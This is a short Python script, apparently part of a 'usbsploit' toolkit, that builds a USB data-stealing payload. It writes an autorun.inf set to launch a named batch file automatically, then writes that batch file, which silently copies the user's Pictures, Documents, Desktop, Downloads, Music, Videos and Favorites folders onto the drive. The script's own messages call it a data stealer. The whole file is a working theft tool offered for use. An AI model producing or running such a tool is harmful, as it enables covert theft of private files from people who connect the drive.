import sys
import colorama 
from colorama import Fore
import os
import time
from subprocess import getoutput
if len(sys.argv) < 3:
    exit()

folder = sys.argv[1]
name = sys.argv[2]
path = "/usr/share/usbsploit/devices/USB"


code = f'''
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y /g
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\{folder}\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\{folder}\Favorites"
%backupcmd% "%USERPROFILE%\\videos" "%drive%\{folder}\\vids"
%backupcmd% "%USERPROFILE%\Download" "%drive%\{folder}\Download"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\{folder}\Desktop"
%backupcmd% "%USERPROFILE%\Music" "%drive%\{folder}\Music"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\{folder}\Documents"
@echo off 
'''
autorun_script = f'''
[autorun]
Open={name}
ShellExecute={name}
UseAutoPlay=1
'''
print(Fore.BLUE+'[i]'+Fore.RESET+' Building...')
time.sleep(1)
os.system(f'touch {path}/autorun.inf')
print(Fore.BLUE+'[i]'+Fore.RESET+' Writing the "autorun.inf" script...')
try:
    with open(path+'/autorun.inf', 'w') as run:
        run.write(autorun_script)
    print(Fore.BLUE+'[i]'+Fore.RESET+' Done.')
    print(Fore.BLUE+'[i]'+Fore.RESET+f' Writing the data stealer file as "{name}"...')
    time.sleep(1)
    os.system(f'touch {path}/{name}')
    with open(path+'/'+name, 'w') as main:
        main.write(code)
    print(Fore.YELLOW+'[+]'+Fore.RESET+f' Done, Saved as "{name}"')
except:
    pass